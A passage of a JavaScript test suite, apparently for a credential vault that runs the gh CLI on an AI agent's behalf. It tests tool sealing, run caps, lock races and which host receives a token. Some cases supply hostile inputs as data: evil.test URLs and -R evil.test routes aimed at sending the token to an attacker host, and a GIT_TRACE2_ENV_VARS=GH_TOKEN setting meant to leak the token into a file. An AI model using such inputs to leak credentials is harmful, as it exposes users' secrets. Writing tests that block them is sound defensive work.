  // DRIFT (round 15 BLOCKER): a SEALED (root-owned, modeled) gh whose bytes DIFFER from the shipped 2.102.0 pin RUNS — the SEAL is
  // the content fence, the sha256 is a DRIFT RECORD, never a gate. (digestVouch returns a non-pin sha for SHIMGH, modeled root-owned
  // via toolSealed.) On fca70cfe this was tool_changed — every root-owned non-2.102.0 gh (the hub's own 2.100.0, every apt gh) refused.
  const S = capOf();
  const GHSHIM = path.join(ROOT, 'ghshim'); fs.mkdirSync(GHSHIM, { recursive: true });
  fs.writeFileSync(path.join(GHSHIM, 'gh'), "#!/usr/bin/env node\nprocess.stdout.write('shim\\n');\n", { mode: 0o755 });
  const SHIMGH = path.join(GHSHIM, 'gh');
  const dS = sw.mk(DOOR, { isRootOwned: REAL, toolDigest: digestVouch, toolSealed: (p, fd) => p === SHIMGH || DOOR.sealedToolReal(p, fd), spawnImpl: S.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHSHIM, '/usr/bin', '/bin'].join(':') }) });
  const rS = await dS.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', SHIMGH, 'issue', 'list'], cwd: sw.work });
  const toolsFile = path.join(sw.dataDir, 'vault-run-tools.json');
  const toolsStore = fs.existsSync(toolsFile) ? JSON.parse(fs.readFileSync(toolsFile, 'utf8')) : null;
  const shimRec = toolsStore && toolsStore.tools && toolsStore.tools[SHIMGH];
  ok(rS.ok && rS.by === 'own' && !!S.get() && shimRec && shimRec.sha256 === 'dead'.repeat(16), 'round 15 (BLOCKER): a SEALED gh whose bytes ≠ the shipped pin RUNS ok:own and its digest is DRIFT-RECORDED in data/vault-run-tools.json (the seal is the content fence; the digest is a record, never a gate) — base refused it tool_changed', { ok: rS.ok, by: rS.by, spawned: !!S.get(), recorded: shimRec && shimRec.sha256 });

  // round 17 (item 3): a SEALED tool whose bytes drifted since the last run files ONE For-you FYI notice (no decision), per (tool, hub) until the next drift
  {
    const DGH = path.join(ROOT, 'ghdrift'); fs.mkdirSync(DGH, { recursive: true });
    fs.writeFileSync(path.join(DGH, 'gh'), "#!/usr/bin/env node\nprocess.stdout.write('d\\n');\n", { mode: 0o755 });
    const DGHGH = path.join(DGH, 'gh'), dst = fs.statSync(DGHGH), DW = capOf();
    const dDW = sw.mk(DOOR, { isRootOwned: REAL, toolDigest: (fd) => { let t = null; try { t = fs.readlinkSync('/proc/self/fd/' + fd); } catch { } return Promise.resolve(t === DGHGH ? GHSHA : 'dead'.repeat(16)); }, toolSealed: (p, fd) => p === DGHGH || DOOR.sealedToolReal(p, fd), spawnImpl: DW.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [DGH, '/usr/bin', '/bin'].join(':') }) });
    const tf = path.join(sw.dataDir, 'vault-run-tools.json');
    const cur = fs.existsSync(tf) ? JSON.parse(fs.readFileSync(tf, 'utf8')) : { v: 1, tools: {} };
    cur.tools[DGHGH] = { path: DGHGH, dev: dst.dev, ino: dst.ino, size: dst.size, mtime: Math.round(dst.mtimeMs), sha256: 'bb'.repeat(32), version: '2.100.0' };   // a PRIOR record with a different sha + no noticedSha ⇒ the next run is a first-notice drift
    fs.writeFileSync(tf, JSON.stringify(cur));
    const driftNotes = () => (sw.userTodos.snapshot().open || []).filter((i) => i.kind === 'notice' && !i.action && /on this machine changed/.test(i.text || ''));
    const dn0 = driftNotes().length;
    const rd1 = await dDW.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', DGHGH, 'issue', 'list'], cwd: sw.work });
    const dn1 = driftNotes().length;
    await dDW.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', DGHGH, 'issue', 'list'], cwd: sw.work });
    const dn2 = driftNotes().length, dnote = driftNotes().find((i) => /machine changed/.test(i.text));
    ok(rd1.ok && rd1.by === 'own' && dn1 - dn0 === 1 && dn2 - dn0 === 1 && dnote && /gh on this machine changed: 2\.100\.0 → 2\.102\.0 .*runs continue/.test(dnote.text) && dnote.origin === 'vault' && !dnote.action && dnote.i18n && dnote.i18n.text.params.from === '2.100.0',
      'round 17 (item 3): a SEALED gh whose bytes drifted files ONE For-you FYI notice (no decision) — «gh on this machine changed: 2.100.0 → 2.102.0 … runs continue»; a second run after the SAME drift files no second item (base: a log + audit line only, no For-you notice)', { dn0, dn1, dn2, text: dnote && dnote.text });
  }

  // REAL-OWNERSHIP CONTROL (round 14 BLOCKER): the exported sealed predicate on the box's /usr/bin/gh (root-owned) vs a uid-owned
  // fixture — the VERDICT says sealed/unsealed with NO vendor call (gh --version is not a vault verb).
  const SYSGH = '/usr/bin/gh';
  if (fs.existsSync(SYSGH)) {
    const fdR = fs.openSync(SYSGH, 'r'); const sysSealed = DOOR.sealedToolReal(SYSGH, fdR); fs.closeSync(fdR);
    const fdX = fs.openSync(GHREAL_GH, 'r'); const uidSealed = DOOR.sealedToolReal(GHREAL_GH, fdX); fs.closeSync(fdX);
    ok(sysSealed === true && uidSealed === false, 'round 14 (BLOCKER, REAL ownership): /usr/bin/gh (root-owned chain + root-owned inode) IS sealed; the uid-owned fixture is NOT — the exported rule, no gh run', { sysSealed, uidSealed });
  } else { console.log('  – ①② real /usr/bin/gh ownership control SKIPPED: no /usr/bin/gh on this box'); }

  // CAP RED (round 14 MAJOR): the digest is taken FIRST, before the cap check, with NO await between the cap check and runs.add —
  // so 20 parallel own runs from one conversation spawn exactly RUNS_PER_CALLER (4) and the rest are too_many_runs by name (base:
  // the digest await sat between the cap check and runs.add, so all 20 saw callerRuns 0 and spawned).
  {
    const realKill = process.kill; process.kill = function (pid, sig) { if (typeof pid === 'number' && pid < 0 && -pid >= 93000 && -pid < 96000) return true; return realKill.call(process, pid, sig); };   // the fakes' pids are not ours: the door's group kill at their end is caught here (lane lg-vault-file's read: a real group with that id would have died)
    let spawns = 0;
    const capSpawn = (cmd, args, opts) => { spawns++; const c = new EventEmitter(); c.pid = 93000 + spawns; c.stdout = new EventEmitter(); c.stdout.destroy = () => {}; c.stderr = new EventEmitter(); c.stderr.destroy = () => {}; c.stdin = null; setImmediate(() => { c.emit('exit', 0, null); c.emit('close', 0, null); }); return c; };
    const dCap = mkGh({ spawnImpl: capSpawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const runs20 = await Promise.all(Array.from({ length: 20 }, () => dCap.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work })));
    const ran = runs20.filter((r) => r.ok).length, capped = runs20.filter((r) => !r.ok && r.code === 'too_many_runs').length;
    ok(ran === 4 && capped === 16 && spawns === 4, 'round 14 (MAJOR, caps): 20 parallel own runs ⇒ exactly 4 spawn + 16 too_many_runs by name (the digest is taken before the cap check; no await to runs.add) — base spawned all 20', { ran, capped, spawns });
    process.kill = realKill;
  }

  // LOCK-DURING-HASH RED (round 14 MAJOR): the vault locks WHILE the digest streams. On mine the door re-reads the state after the
  // await ⇒ vault_locked BY NAME, nothing spawned (base: the hash sat in spawnRun after the cap check, so valueOf then threw
  // entry_unknown — the WRONG name — and a child was spawned then stopped).
  {
    const LK = capOf();
    const lockDigest = () => { sw.vault.lock('door'); return Promise.resolve(GHSHA); };
    const dLK = mkGh({ toolDigest: lockDigest, spawnImpl: LK.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const rLK = await dLK.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work });
    ok(!rLK.ok && rLK.code === 'vault_locked' && !LK.get(), 'round 14 (MAJOR): a lock DURING the hash ⇒ vault_locked by name, nothing spawned (base: entry_unknown + a child spawned-then-stopped)', { code: rLK.code, spawned: !!LK.get() });
    await sw.vault.unlock(PW);
  }

  // CALLER-GONE-DURING-HASH RED (round 14 MAJOR): the caller aborts WHILE the digest streams. On mine the door re-checks the signal
  // after the await ⇒ caller_gone, nothing spawned (base: spawnRun had no signal re-check after the hash — spawn-then-stop).
  {
    const GN = capOf();
    const ac = new AbortController();
    const goneDigest = () => { ac.abort(); return Promise.resolve(GHSHA); };
    const dGN = mkGh({ toolDigest: goneDigest, spawnImpl: GN.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const rGN = await dGN.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work, signal: ac.signal });
    ok(!rGN.ok && rGN.code === 'caller_gone' && !GN.get(), 'round 14 (MAJOR): a caller gone DURING the hash ⇒ caller_gone, nothing spawned (base: spawn-then-stop)', { code: rGN.code, spawned: !!GN.get() });
  }


  // ── ROUND 15 ITEM 1 (BLOCKER): a ROOT-OWNED gh of ANY version RUNS (drift-recorded), never tool_changed ──
  // the REAL /usr/bin/gh (root-owned, likely NOT the pinned 2.102.0): SEALED ⇒ runs with a minted value + a drift baseline, no gate.
  {
    const SYSGH2 = '/usr/bin/gh';
    if (fs.existsSync(SYSGH2)) {
      const S1 = capOf();
      const dSys = sw.mk(DOOR, { isRootOwned: REAL, toolDigest: digestVouch, spawnImpl: S1.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: ['/usr/bin', '/bin'].join(':') }) });   // DEFAULT toolSealed = the REAL chain+fstat rule (no inject) — /usr/bin/gh is genuinely root-owned
      const rSys = await dSys.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', SYSGH2, 'issue', 'list'], cwd: sw.work });
      const ts = fs.existsSync(path.join(sw.dataDir, 'vault-run-tools.json')) ? JSON.parse(fs.readFileSync(path.join(sw.dataDir, 'vault-run-tools.json'), 'utf8')) : null;
      ok(rSys.ok && rSys.by === 'own' && !!S1.get() && ts && ts.tools && ts.tools[SYSGH2] && /^[0-9a-f]{64}$/.test(ts.tools[SYSGH2].sha256), 'round 15 (BLOCKER, REAL ownership): the box\'s root-owned /usr/bin/gh (any version) RUNS ok:own with a minted value and is drift-recorded — no tool_changed, no vendor call (base refused it unless it was exactly the pinned 2.102.0)', { ok: rSys.ok, by: rSys.by, recorded: !!(ts && ts.tools && ts.tools[SYSGH2]) });
    } else { console.log('  – round 15 item 1 REAL /usr/bin/gh run SKIPPED: no /usr/bin/gh on this box'); }
  }

  // ── ROUND 15 ITEM 2a (MAJOR, ONE host set): a GHES-minted value + -R o/r --body evil.test ──
  // the card asks for github.com (the ROUTE of -R o/r), names evil.test ONLY as a mention, and homes to github.com + GH_TOKEN.
  {
    const A2 = capOf();
    const dA2m = mkGh({ spawnImpl: A2.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const pA2 = dA2m.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/site-pw', '--', GHREAL_GH, 'issue', 'create', '-R', 'o/r', '--title', 't', '--body', 'see https://evil.test/x'], cwd: sw.work });
    const cA2 = await waitCard(sw); const dA2d = cA2 ? cA2.detail : '';
    if (cA2) dA2m.answer(cA2.action.askId, { answer: 'once' });
    const rA2 = await pA2; const EA2 = A2.get() ? A2.get().env : {};
    ok(rA2.ok && /sends it to github\.com/.test(dA2d) && !/sends it to evil\.test/.test(dA2d) && /Mentions.*evil\.test/.test(dA2d) && EA2.GH_HOST === 'github.com' && EA2.GH_TOKEN === 'agent-minted-pw-0123456789abc' && EA2.GH_ENTERPRISE_TOKEN === undefined,
      'round 15 (MAJOR 2a): a GHES-minted value + -R o/r --body evil.test — the CARD asks for github.com (the route), names evil.test only as a Mention, and homes to github.com + GH_TOKEN; evil.test is never a target (base: the card named evil.test)', { ok: rA2.ok, GH_HOST: EA2.GH_HOST, sendsGithub: /sends it to github\.com/.test(dA2d), mentionsEvil: /Mentions.*evil\.test/.test(dA2d) });
  }

  // ── ROUND 15 ITEM 2b (MAJOR, ONE host set): a github-minted value + --body evil.test (no -R) ⇒ NO card, NO pass ──
  // and the LATER run that ROUTES to evil.test (-R evil.test/o/r) on the SAME door ASKS (the body mention never became a pass).
  {
    const B2 = capOf();
    const dB2 = mkGh({ spawnImpl: B2.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const before = cardsOf(sw).length;
    const r1 = await dB2.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-mint', '--', GHREAL_GH, 'issue', 'create', '--title', 't', '--body', 'see https://evil.test/x'], cwd: sw.work });
    const added = cardsOf(sw).length - before;
    const p2 = dB2.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-mint', '--', GHREAL_GH, 'issue', 'list', '-R', 'evil.test/o/r'], cwd: sw.work });
    const c2 = await waitCard(sw);
    ok(r1.ok && r1.by === 'own' && added === 0 && !!c2 && /sends it to evil\.test/.test(c2.detail), 'round 15 (MAJOR 2b): --body evil.test (github-minted, no -R) routes to github.com ⇒ NO card, NO evil.test pass kept; a LATER -R evil.test/o/r on the same door ASKS (base: the body Allow kept a pass for evil.test, the later run ran silent)', { by: r1.by, addedCards: added, laterAsks: !!c2 });
    if (c2) dB2.answer(c2.action.askId, { answer: 'deny' });
    await p2.catch(() => {});
  }

  // ── ROUND 15 ITEM 2c (MAJOR, ONE host set): gh api <GHES url> — the endpoint URL is a ROUTE host ──
  // the card asks for the GHES host, and after approval GH_HOST + GH_ENTERPRISE_TOKEN carry the APPROVED credential there.
  {
    const C2 = capOf();
    const dC2 = mkGh({ spawnImpl: C2.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const pC2 = dC2.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-mint', '--', GHREAL_GH, 'api', 'https://ghe.example.test/api/v3/repos/o/r'], cwd: sw.work });
    const cC2 = await waitCard(sw); const dC2d = cC2 ? cC2.detail : '';
    if (cC2) dC2.answer(cC2.action.askId, { answer: 'once' });
    const rC2 = await pC2; const EC2 = C2.get() ? C2.get().env : {};
    ok(rC2.ok && rC2.by === 'once' && EC2.GH_HOST === 'ghe.example.test' && EC2.GH_ENTERPRISE_TOKEN === 'agent-minted-ghv-0123456789abc' && EC2.GH_TOKEN === undefined && /sends it to ghe\.example\.test/.test(dC2d),
      'round 15 (MAJOR 2c): gh api https://ghe.example.test/... — the endpoint URL is a ROUTE host; the card asks for ghe.example.test and after approval GH_HOST=ghe.example.test + GH_ENTERPRISE_TOKEN carry the credential there (base: sealed github.com + GH_TOKEN, so gh never sent the approved credential)', { by: rC2.by, GH_HOST: EC2.GH_HOST, ENT: !!EC2.GH_ENTERPRISE_TOKEN });
  }

  // ── ROUND 15 ITEM 3 (MINOR): only git-DRIVING verbs need git on the sealed PATH; the probe is RE-ASKED when it was false ──
  {
    const G1 = capOf();
    const dG1 = mkGh({ spawnImpl: G1.spawn, probeGit: () => false, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const rApi = await dG1.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'api', '/user'], cwd: sw.work });
    ok(rApi.ok && rApi.by === 'own' && !!G1.get(), 'round 15 (MINOR 3): gh api (never runs git) RUNS ok:own even when git is absent from the sealed PATH (base: run_path_unsafe refused EVERY gh run)', { ok: rApi.ok, by: rApi.by });
    const G2 = capOf();
    const dG2 = mkGh({ spawnImpl: G2.spawn, probeGit: () => false, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const rClone = await dG2.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'repo', 'clone', 'o/r'], cwd: sw.work });
    ok(!rClone.ok && rClone.code === 'git_not_on_seal' && !G2.get(), 'round 15 (MINOR 3): gh repo clone (DRIVES git) is git_not_on_seal by NAME when git is absent — not run_path_unsafe, and ONLY a git-driving verb is refused', { code: rClone.code, spawned: !!G2.get() });
    let gitHere = false;
    const G3 = capOf();
    const dG3 = mkGh({ spawnImpl: G3.spawn, probeGit: () => gitHere, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const rC1 = await dG3.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'repo', 'clone', 'o/r'], cwd: sw.work });
    gitHere = true;
    const rC2 = await dG3.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'repo', 'clone', 'o/r'], cwd: sw.work });
    ok(rC1.code === 'git_not_on_seal' && rC2.ok && rC2.by === 'own', 'round 15 (MINOR 3): the git-on-seal probe is RE-ASKED per refused call — git installed after boot ⇒ gh repo clone refused then RUNS (base: gitOnSeal probed once at boot, never re-checked)', { first: rC1.code, second: rC2.ok });
  }

  // ── ROUND 15 ITEM 4 (MINOR): the PER-CALLER cap is checked BEFORE the hash — an over-cap call never hashes ──
  {
    const realKill = process.kill; process.kill = function (pid, sig) { if (typeof pid === 'number' && pid < 0 && -pid >= 93000 && -pid < 96000) return true; return realKill.call(process, pid, sig); };   // the fakes' pids are not ours: the door's group kill at their end is caught here (lane lg-vault-file's read: a real group with that id would have died)
    let hashes = 0; const kids = [];
    const countingDigest = (fd) => { hashes++; return digestVouch(fd); };
    const holdSpawn = () => { const c = new EventEmitter(); c.pid = 95000 + kids.length; c.stdout = new EventEmitter(); c.stdout.destroy = () => {}; c.stderr = new EventEmitter(); c.stderr.destroy = () => {}; c.stdin = null; kids.push(c); return c; };   // never closes ⇒ the run stays in `runs`
    const dH = sw.mk(DOOR, { isRootOwned: REAL, toolDigest: countingDigest, toolSealed: sealedVouch, spawnImpl: holdSpawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const prime = Array.from({ length: 4 }, () => dH.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work }));
    for (let i = 0; i < 300 && dH.running() < 4; i++) await sleep(10);   // each run waits for its scrubber worker before its child spawns (lane lg-vault-file, the scan off the loop): the four are in `runs` within milliseconds, not turns
    const primedHashes = hashes;   // the 4 priming runs share ONE memoised hash (same inode)
    hashes = 0;
    const over = await Promise.all(Array.from({ length: 20 }, () => dH.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work })));
    const capped = over.filter((r) => !r.ok && r.code === 'too_many_runs').length;
    ok(dH.running() === 4 && capped === 20 && hashes === 0 && primedHashes === 1, 'round 15 (MINOR 4): an over-cap conversation (4 held) ⇒ 20 parallel calls are too_many_runs BEFORE the hash — 0 digests of the 42 MB binary (base: all 20 hashed); the 4 priming runs shared ONE memoised hash', { running: dH.running(), capped, hashes, primedHashes });
    for (const c of kids) { c.emit('exit', 0, null); c.emit('close', 0, null); }   // release the held runs (finish ⇒ runs.delete + shred) so the process exits clean
    await Promise.all(prime);
    process.kill = realKill;
  }

  // RUN B — own MINTED site-pw (--for api.example.com, a non-github host) ⇒ the door pins GH_HOST AND homes the credential to
  // GH_ENTERPRISE_TOKEN (the agent passed a GH_TOKEN reference and named neither the host nor the enterprise credential name).
  const B = capOf();
  const dB = mkGh({ spawnImpl: B.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
  const rB = await dB.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/site-pw', '--', GHREAL_GH, 'issue', 'list', '-R', 'api.example.com/o/r'], cwd: sw.work });
  const EB = B.get() ? B.get().env : {};
  ok(rB.ok && rB.by === 'own' && EB.GH_HOST === 'api.example.com' && EB.GH_ENTERPRISE_TOKEN === 'agent-minted-pw-0123456789abc' && EB.GH_TOKEN === undefined,
    'round 12 (MINOR): a value minted --for a GHES host pins GH_HOST and the DOOR homes the credential to GH_ENTERPRISE_TOKEN (GH_TOKEN cleared) — the agent named neither', { GH_HOST: EB.GH_HOST, ENT: EB.GH_ENTERPRISE_TOKEN, TOK: EB.GH_TOKEN });

  // RUN D (round 13 MINOR): a value minted --for github.com, the call NAMES a GHES host (-R ghe.example.test/o/r) approved on a
  // card ⇒ GH_HOST and the credential follow the host the VERDICT APPROVED (ghe.example.test → GH_ENTERPRISE_TOKEN), not the mint's
  // --for (github.com). On base the seal pinned the mint's --for: GH_HOST=github.com + GH_TOKEN, the request reaching nowhere.
  const Dd = capOf();
  const dDd = mkGh({ spawnImpl: Dd.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
  const pDd = dDd.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-mint', '--', GHREAL_GH, 'issue', 'list', '-R', 'ghe.example.test/o/r'], cwd: sw.work });
  const cardDd = await waitCard(sw);
  if (cardDd) dDd.answer(cardDd.action.askId, { answer: 'once' });
  const rDd = await pDd;
  const EDd = Dd.get() ? Dd.get().env : {};
  ok(rDd.ok && rDd.by === 'once' && EDd.GH_HOST === 'ghe.example.test' && EDd.GH_ENTERPRISE_TOKEN === 'agent-minted-ghv-0123456789abc' && EDd.GH_TOKEN === undefined,
    'round 13 (MINOR): a value minted --for github.com, the call -R ghe.example.test approved on a card ⇒ GH_HOST + GH_ENTERPRISE_TOKEN follow the APPROVED host, not the mint\'s --for (base pinned github.com + GH_TOKEN, reaching nowhere)', { ok: rDd.ok, by: rDd.by, GH_HOST: EDd.GH_HOST, ENT: !!EDd.GH_ENTERPRISE_TOKEN, TOK: EDd.GH_TOKEN, card: !!cardDd });

  // ITEM-4 FORWARD RED (round 14 MAJOR, sealHost routing): a github-minted value, the call names -R o/r (routes to github.com) but
  // mentions evil.test in the --body. The SEAL follows the ROUTING host (github.com) ⇒ GH_HOST=github.com + GH_TOKEN; evil.test (a
  // body URL, the card's words) is never a routing host. On base the seal took the single non-default shape host ⇒ GH_HOST=evil.test
  // + GH_ENTERPRISE_TOKEN (the token homed to a host named only in free text).
  const F = capOf();
  const dF = mkGh({ spawnImpl: F.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
  const pF = dF.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-mint', '--', GHREAL_GH, 'issue', 'create', '-R', 'o/r', '--title', 't', '--body', 'see https://evil.test/x'], cwd: sw.work });
  const cardF = await waitCard(sw);
  if (cardF) dF.answer(cardF.action.askId, { answer: 'once' });
  const rF = await pF; const EF = F.get() ? F.get().env : {};
  ok(rF.ok && EF.GH_HOST === 'github.com' && EF.GH_TOKEN === 'agent-minted-ghv-0123456789abc' && EF.GH_ENTERPRISE_TOKEN === undefined,
    'round 14 (MAJOR, sealHost routing): a github-minted value with -R o/r + a --body evil.test URL homes to GH_HOST=github.com + GH_TOKEN (the routing host), NOT the body URL (base: GH_HOST=evil.test + GH_ENTERPRISE_TOKEN)', { GH_HOST: EF.GH_HOST, TOK: EF.GH_TOKEN, ENT: EF.GH_ENTERPRISE_TOKEN, card: !!cardF });

  // ITEM-4 REVERSE RED (round 14 MAJOR): a value minted --for a GHES host (api.example.com), the call names -R github.com/o/r
  // (routes to github.com) approved on a card. The SEAL follows the APPROVED routing host (github.com) ⇒ GH_HOST=github.com +
  // GH_TOKEN. On base the seal stayed pinned to the mint's --for ⇒ GH_HOST=api.example.com + GH_ENTERPRISE_TOKEN (the wrong host).
  const RV = capOf();
  const dRV = mkGh({ spawnImpl: RV.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
  const pRV = dRV.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/site-pw', '--', GHREAL_GH, 'issue', 'create', '-R', 'github.com/o/r', '--title', 't', '--body', 'b'], cwd: sw.work });
  const cardRV = await waitCard(sw);
  if (cardRV) dRV.answer(cardRV.action.askId, { answer: 'once' });
  const rRV = await pRV; const ERV = RV.get() ? RV.get().env : {};
  ok(rRV.ok && ERV.GH_HOST === 'github.com' && ERV.GH_TOKEN === 'agent-minted-pw-0123456789abc' && ERV.GH_ENTERPRISE_TOKEN === undefined,
    'round 14 (MAJOR, sealHost both directions): a GHES-minted value used against -R github.com/o/r (approved) homes to GH_HOST=github.com + GH_TOKEN — the approved routing host wins over the mint\'s --for (base: GH_HOST=api.example.com + GH_ENTERPRISE_TOKEN)', { GH_HOST: ERV.GH_HOST, TOK: ERV.GH_TOKEN, ENT: ERV.GH_ENTERPRISE_TOKEN, card: !!cardRV });

  // BOOT SEAL (round 14 MINOR): the sealed PATH + git-on-seal are computed ONCE at the door's construction (a boot step, < 250 ms),
  // not on the event loop at the first spawn.
  const bs = dA._bootSeal();
  ok(typeof bs.ms === 'number' && bs.ms >= 0 && bs.gitOnSeal === true, 'round 14 (MINOR): the sealed PATH + git-on-seal are computed at BOOT (a finite ms, reported; the boot law < 250 ms is measured in the report, never asserted as a flaky wall-clock bound) — not lazily at the first spawn', bs);

  // RUN C — a runSeal tool resolved via an absolute path from a uid-owned dir, the agent PATH ALL uid-owned ⇒ the sealed PATH is
  // EMPTY ⇒ refused BY NAME (gh could not find git). A root hub, or git only under a writable prefix.
  const C = capOf();
  const dC = mkGh({ spawnImpl: C.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [WSEAL, GHREAL].join(':') }) });
  const rC = await dC.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work });
  ok(!rC.ok && rC.code === 'run_path_unsafe' && !C.get(), 'round 12 (MAJOR 2): a runSeal tool whose sealed PATH comes out empty (every dir uid-owned) is refused BY NAME (run_path_unsafe) — nothing spawned', { ok: rC.ok, code: rC.code });

  // ENV ALLOWLIST through the DOOR — a non-allowlisted agent env (GIT_TRACE2_ENV_VARS + GIT_TRACE2_EVENT) ⇒ env_refused BY NAME
  // before any plan; gh's git child can never write the token VALUE to a file the agent names.
  const rTrace = await dA.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--env', 'GIT_TRACE2_ENV_VARS=GH_TOKEN', '--env', 'GIT_TRACE2_EVENT=/tmp/x', '--', GHREAL_GH, 'pr', 'create', '-R', 'o/r', '--head', 'feat', '-t', 't', '-b', 'b'], cwd: sw.work });
  ok(!rTrace.ok && rTrace.code === 'env_refused', 'round 12 (MAJOR): GIT_TRACE2_ENV_VARS=GH_TOKEN + GIT_TRACE2_EVENT=<agent file> ⇒ env_refused BY NAME — the agent env is an allowlist, so no GIT_* road is open', { code: rTrace.code });

  // a NON-seal tool (the printer) is spawned on the agent env unchanged — the seal is row-driven (gh only), no blanket regression
  const P = capOf();
  const printDoor = mkGh({ spawnImpl: P.spawn, agentEnv: () => ({ ...SUITE_ENV, MARKER_XYZ: 'kept', PATH: [WSEAL, BIN, '/usr/bin', '/bin'].join(':') }) });
  await printDoor.run({ caller: sw.caller, args: ['--env', 'T=vault://agent:conv-1/gh-token', '--', NODE, PRINTER, 'ran', path.join(sw.work, 'x.txt')], cwd: sw.work });
  const EP = P.get() ? P.get().env : {};
  ok(EP.MARKER_XYZ === 'kept' && (EP.PATH || '').split(':').includes(WSEAL) && EP.GH_CONFIG_DIR === undefined && EP.HOME !== NOWHERE && EP.GIT_CONFIG_GLOBAL === undefined, 'BLOCKER: a NON-runSeal tool (node) is spawned on the agent env UNCHANGED (writable PATH head kept, no GH_CONFIG_DIR / nowhere-HOME / git-child seal) — the seal is row-driven', { MARKER_XYZ: EP.MARKER_XYZ, hasWseal: (EP.PATH||'').split(':').includes(WSEAL) });

  // the suite's OWN environment: no run of this suite sees the caller's (the mark only the caller's env carries) — RED: a door whose
  // agent env spreads process.env (the suite's old shape) hands the run the caller's mark
  ok(EP.VS_SUITE_CALLER_MARK === undefined && EP.HOME === SUITE_HOME, '主开发 00:56Z: the printer door\'s run carries no caller mark and the stand-in HOME — BY CONSTRUCTION (its env is built inline from SUITE_ENV); the leg through world()\'s own default door below is the one that carries the meaning', { mark: EP.VS_SUITE_CALLER_MARK, home: EP.HOME });
  { const P2 = capOf();
    const leakDoor = mkGh({ spawnImpl: P2.spawn, agentEnv: () => ({ ...process.env, PATH: [WSEAL, BIN, '/usr/bin', '/bin'].join(':') }) });   // stale-pins: kept — a RED control: the suite's old caller-env spread, on purpose
    await leakDoor.run({ caller: sw.caller, args: ['--env', 'T=vault://agent:conv-1/gh-token', '--', NODE, PRINTER, 'ran', path.join(sw.work, 'x2.txt')], cwd: sw.work });
    const E2 = P2.get() ? P2.get().env : {};
